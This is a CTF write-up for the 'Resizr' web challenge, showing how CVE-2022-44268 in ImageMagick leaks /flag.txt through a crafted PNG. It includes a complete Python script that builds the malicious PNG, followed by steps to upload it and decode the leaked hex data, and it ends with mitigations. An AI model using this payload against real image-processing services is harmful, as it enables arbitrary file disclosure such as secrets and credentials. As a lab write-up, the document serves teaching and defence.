# Resizr CTF Challenge Writeup

## Challenge Overview
- **Name**: Resizr
- **Category**: Web
- **Description**: "It's like magick!"
- **Attached**: [`resizr.zip`](./Files/resizr.zip)

## Initial Analysis

The challenge provides a Dockerfile and Flask application that:

1. Installs ImageMagick 7.1.0-49
2. Provides an endpoint to upload PNG images
3. Uses ImageMagick to resize uploaded images to 50%
4. Returns the processed image

Key files from the challenge:

- `flag.txt` is stored in `/flag.txt`
- The application uses `subprocess.run(["magick", "-", "-resize", "50%", "png:-"])` to process images

## Vulnerability Identification

The specific ImageMagick version (7.1.0-49) is vulnerable to **CVE-2022-44268** - an information disclosure vulnerability that allows reading arbitrary files through PNG metadata manipulation.

## Exploitation Strategy

The vulnerability works by:

1. Crafting a malicious PNG with a `tEXt` chunk containing `profile` keyword
2. Setting the profile value to the target file path (`/flag.txt`)
3. When ImageMagick processes this PNG, it reads the specified file
4. The file content gets embedded in the output PNG's metadata as hex-encoded data

## Solution Implementation

### Step 1: Create Malicious PNG

```python
#!/usr/bin/env python3
import struct
import zlib

def create_malicious_png(target_file="/flag.txt"):
    """
    Create a malicious PNG that exploits CVE-2022-44268
    to read arbitrary files via ImageMagick
    """
    
    # PNG signature
    png_signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR chunk (image header) - 1x1 pixel RGB image
    width = 1
    height = 1
    bit_depth = 8
    color_type = 2  # RGB
    compression = 0
    filter_method = 0
    interlace = 0
    
    ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 
                           compression, filter_method, interlace)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
    ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' \
			+ ihdr_data + struct.pack('>I', ihdr_crc)
    
    # tEXt chunk with profile keyword pointing to target file
    # This is the key to the exploit - ImageMagick will try to read this as a file path
    txt_keyword = b'profile'
    txt_content = target_file.encode('ascii')
    txt_data = txt_keyword + b'\x00' + txt_content
    txt_crc = zlib.crc32(b'tEXt' + txt_data) & 0xffffffff
    txt_chunk = struct.pack('>I', len(txt_data)) + b'tEXt' \
			+ txt_data + struct.pack('>I', txt_crc)
    
    # IDAT chunk (image data) - minimal data for 1x1 RGB pixel
    # Raw image data: one white pixel (RGB: 255,255,255)
    raw_data = b'\x00\xff\xff\xff'  # Filter byte + RGB values
    compressed_data = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b'IDAT' + compressed_data) & 0xffffffff
    idat_chunk = struct.pack('>I', len(compressed_data)) + b'IDAT' \
			+ compressed_data + struct.pack('>I', idat_crc)
    
    # IEND chunk (end of image)
    iend_crc = zlib.crc32(b'IEND') & 0xffffffff
    iend_chunk = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    
    # Combine all chunks
    png_data = png_signature + ihdr_chunk + txt_chunk + idat_chunk + iend_chunk
    
    return png_data

# Generate the exploit
malicious_png = create_malicious_png("/flag.txt")
with open('exploit.png', 'wb') as f:
    f.write(malicious_png)
```

### Step 2: Upload and Process

1. Upload `exploit.png` to the `/upload` endpoint
2. Download the returned processed image (`out.png`)

### Step 3: Extract Flag from Metadata

```bash
strings out.png
```

Output shows:
```
HtEXtRaw profile type txt
      18
5356555343477b743373745f666c34677d0a
```

### Step 4: Decode Hex Data

The hex string `5356555343477b743373745f666c34677d0a` contains our flag:

```python
>>> bytes.fromhex('5356555343477b743373745f666c34677d0a')
b'SVUSCG{t3st_fl4g}\n'
```

## Flag
**SVUSCG{t3st_fl4g}**

## Key Learnings

1. **Version-specific vulnerabilities**: Specific ImageMagick versions have known CVEs
2. **PNG structure**: Understanding PNG chunk format is crucial for crafting valid exploits
3. **Metadata extraction**: File content gets embedded as hex-encoded metadata in processed images
4. **CVE-2022-44268**: This vulnerability allows arbitrary file reads through PNG profile manipulation

## Mitigation

- Update ImageMagick to a patched version
- Implement input validation and sanitization
- Use security policies to restrict ImageMagick's file system access
- Consider using safer image processing alternatives for user uploads